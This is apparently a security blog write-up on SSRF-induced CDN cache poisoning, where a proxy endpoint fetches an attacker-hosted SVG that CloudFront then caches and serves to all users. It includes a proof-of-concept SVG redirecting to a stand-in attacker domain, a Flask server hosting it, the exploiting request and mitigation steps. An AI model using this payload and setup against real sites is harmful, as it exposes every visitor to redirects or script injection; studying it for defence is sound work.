---
date: 2025-05-04 10:15:00
---

# SSRF‑induced Cache Poisoning Logic Bug

![Flow Diagram](https://mermaid.ink/img/pako:eNp9kV9PwjAUxb9Kcw1viIx_gz6YwBCMYmLEoHHzoWyXrbFrsXQGJfvudgUMJsY-9d7fOec2tzuIVYJAoVbbcckNJbtIEhKByTDHCKi9JrhihTAR1E_QgmnOlgI3lcZ5KrRS0sz518Ho9dbbg-sIn5CnmdnjpRLJCTa4NYESSu_pWdOdE4HgEv8VYJLijC1RjFj8lmpVSJtPrXLlTgSVsIxkWdZqkUw1W2dk9lA1h-GCx488fyXn55fkJnzA9wI3Zl-OwkCoIplo-_7XSn0VzlF_oCZDY-wk1HvdbXjHBI-5Kjbkd0BlGrlrcLC6nMC1xuG9VttPMkETZ2TMDHNw7OB1GExIwOIMyU-4w9cOT09GzhfTi-e7maNTR4dQh1TzBKjRBdYhR52zqoQ_Ppnpt2pBpfWsmXxRKj_a7CLTDOiKiY2tinXCDI45s_vLf7oaZYI6sCs3QNt-14UA3cEWaN9r9Pp-p9dp-l3fG3gWflpRq9Xo9Hyv3ep3297A98s6fLmpzUbf75bfvnzLWw)

---

## 1. Bug Mechanics

1. **SSRF**: The attacker supplies the URL of an SVG/XML payload (e.g., `poc.xml`) to the proxy endpoint.  
2. **Fetch & Cache**: The server fetches the payload and responds with `Content-Type: image/svg+xml`, causing CloudFront to **automatically cache** the response.  
3. **Logic Bug**: Once cached, all subsequent requests return the old payload from the CDN — **the attacker’s payload propagates** to all users.

![SSRF Fetch & Cache](/posts/image-post/cache-poisoning-via-fetching-data/1.jpg)

---

## 2. Comparison with Standard Cache Poisoning

| Standard Cache Poisoning            | SSRF‑Logic Bug Variant           |
|-------------------------------------|----------------------------------|
| Client sends payload directly       | Payload via SSRF intermediary    |
| CDN caches server's direct response | CDN caches SSRF endpoint's response |
| Controlled via headers (Host/Vary)  | Bug in the flow “Fetch → Cache → Serve” |

---

## 3. Proof of Concept

### 3.1 SVG/XML Payload (`poc.xml`)

```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
  <foreignObject width="100%" height="100%">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <meta http-equiv="refresh" content="0; url=https://your-attacker-domain.com/" />
    </body>
  </foreignObject>
</svg>
```

### 3.2 Python Flask Demo

```python
from flask import Flask, make_response
import os

app = Flask(__name__)

@app.route('/poc.xml')
def serve_svg_as_xml():
    file_path = os.path.join(os.getcwd(), 'poc.xml')
    if os.path.exists(file_path):
        with open(file_path, 'rb') as f:
            response = make_response(f.read())
            response.headers.set('Content-Type', 'image/svg+xml')
            return response
    return "File poc.xml not found!", 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5505, debug=False)
```

![Flask Demo](/posts/image-post/cache-poisoning-via-fetching-data/6.png)

### 3.3 CloudFront Result

- Request to the SSRF endpoint:
  ```http
  GET /media?u=http://VPS:5505/poc.xml HTTP/2
  Host: vuln.example.com
  ```
- Response headers include:
  ```
  X-Cache: Hit from cloudfront
  Age: 5
  ```
  → This proves the payload was cached.

![CloudFront Hit](/posts/image-post/cache-poisoning-via-fetching-data/7.jpg)

---

## 4. Impact

- The attacker’s payload is “frozen” in the CDN, **all users** receive the malicious content without needing to trigger SSRF again.  
- Enables **mass attacks**: redirect victims, XSS, malicious file downloads…

---

## 5. Mitigation

1. **Whitelist** domains/URLs that the server can fetch.  
2. **Validate** and sanitize the `Content-Type` of the response before returning to the CDN.  
3. Add `Cache-Control: no-store` or `Vary: Origin` headers on the SSRF endpoint.  
4. Implement **rate limiting** and restrict the scope of fetchable URLs.
